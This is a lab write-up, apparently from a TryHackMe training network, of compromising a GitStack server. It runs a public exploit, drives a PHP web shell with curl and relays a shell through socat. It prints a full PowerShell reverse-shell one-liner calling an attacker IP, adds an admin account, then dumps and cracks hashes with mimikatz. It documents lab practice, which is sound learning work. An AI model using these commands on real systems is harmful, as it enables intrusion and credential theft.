# git server exploitation

going to http://10.200.187.150 brings a 404 error, but trying out some of the links on the error page directs us to login page

![](../APPENDIX/screenshot_gitserver.png)

![](../APPENDIX/screenshot_gitserver_login.png)

Default credentials did not work, searched for exploits on searchsploit.

Used the command `searchsploit gitstack` to search for exploits related to gitstack.

![](../APPENDIX/searchsploit.png)

Made copy of exploit into local directory:

```bash
mv 43777.py Desktop/thm/wreath
```

Convert from DOS to Unix:

```bash
dos2unix 43777.py
```

Added `#!/usr/env/python2` at the top of the script. Edited values in 43777.py to match target details, such as target IP. Command was left as `whoami`.

Ran Python script:

```bash
./43777.py
```

![](../APPENDIX/python_script_executed.png)

Note that the `whoami` command returned `nt authority\system`, meaning we have root access to the machine.

Using curl to interact with PHP shell:

```bash
curl -X POST http://10.200.187.150/web/exploit.php -d "a=whoami"
```

![](../APPENDIX/curl.png)

We get `nt authority\system` again.


Using burpsuite to do the same thing:

![](../APPENDIX/burpsuite.png)

Got details such as user running gitserver, hostname, etc.

**Using socat to perform lateral movement:**

Transfering socat from AttackBox to GitServer:

On Kali, in a directory with the `socat` binary:
```bash
python3 -m http.server 8081
```

On WebServer:

```bash
curl 10.50.184.50:8081/socat -o socat-fyr
firewall-cmd --zone=public --add-port 15555/tcp
chmod +x socat-fyr
```

Back on Kali:

```bash
sudo nc -nvlp 443

```

On WebServer:

```bash
./socat-fyr tcp-l:15555 tcp:10.50.187.50:443 &
```

Used Burp tp send a reverse shell:

Insert this command into "a" parameter:

```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('100.200.187.200',15555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

![](../APPENDIX/burp_ps_reverse_shell.png)

Did `CTRL + U` for URL encoding:

![](../APPENDIX/burp_ps_reverse_shell_url_encoded.png)

Sent request, obtained shell from Kali:

![](../APPENDIX/gitserver_revshell.png)

Added new privileged user in Administrator and Remote Management User groups:

![](../APPENDIX/ps_new_user.png)

Used `evil-winrm` to remotely access .150 from Kali:

![](../APPENDIX/evil-winrm.png)

Used `xfreerdp` to do something similar:

![](../APPENDIX/rdp.png)

(I made a new account called fyrw)

Made a new `xfreerdp` session with following parameters:

```bash
xfreerdp /u:fyrw /p:'Password1!' /v:10.200.187.150 /dynamic-resolution +clipboard /drive:/usr/share/windows-resources,fyr-share
```

This added a file share connecting Kali to .150 called "fyr-share", which is linked to `/usr/share/windows-resources`. It has mimikatz.

![](../APPENDIX/file_share.png)

Ran PS as admin, executed mimikatz.exe from file share:

![](../APPENDIX/mimikatz.png)

Used privilege escalation methods to gain SYSTEM integrity, then dumped hashes using `lsa::dump`:

![](../APPENDIX/mimikatz_lsadump.png)

The entire log can be viewed under APPENDIX/mimikatz-fyr.log.

User called "Thomas" hash cracked:

![](../APPENDIX/crackstation.png)

Used `evil-winrm` again to login as Administrator:

![](../APPENDIX/evil-winrm_admin.png)

